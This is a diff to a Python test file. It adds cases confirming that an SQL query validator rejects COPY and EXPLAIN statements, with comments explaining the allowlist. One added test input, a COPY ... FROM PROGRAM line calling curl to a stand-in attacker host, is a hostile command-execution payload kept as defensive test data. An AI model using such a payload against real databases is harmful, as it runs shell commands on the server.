@@ -537,12 +537,23 @@ def test_validate_query_rejects_oversized_query():
         "CREATE TABLE foo (id int)",
         "ALTER TABLE omop.person ADD COLUMN col int",
         "TRUNCATE omop.person",
+        # COPY and EXPLAIN are named by rule 3 of the validate_query docstring but were
+        # previously untested. sqlglot parses them successfully — to exp.Copy and to the
+        # catch-all exp.Command respectively — so neither is caught by the parse step; both
+        # are rejected purely because the allowlist admits only SELECT-shaped top-level nodes.
+        "COPY (SELECT 1) TO STDOUT",
+        "COPY omop.person FROM PROGRAM 'curl attacker.example'",
+        "EXPLAIN SELECT * FROM omop.person",
     ],
 )
 def test_validate_query_rejects_non_select_statements(query: str):
     """
     Non-SELECT statements are rejected at the API layer even though Postgres
     rejects them too — data_analyst_reader has no DDL/DML privileges.
+
+    The COPY and EXPLAIN cases are characterisation tests: they lock in behaviour the
+    allowlist already provides, so a future widening of ``_ALLOWED_QUERY_TYPES`` that let
+    either through fails here rather than silently contradicting the docstring.
     """
     with pytest.raises(HTTPException, match="Only SELECT statements are allowed"):
         validate_query(query)
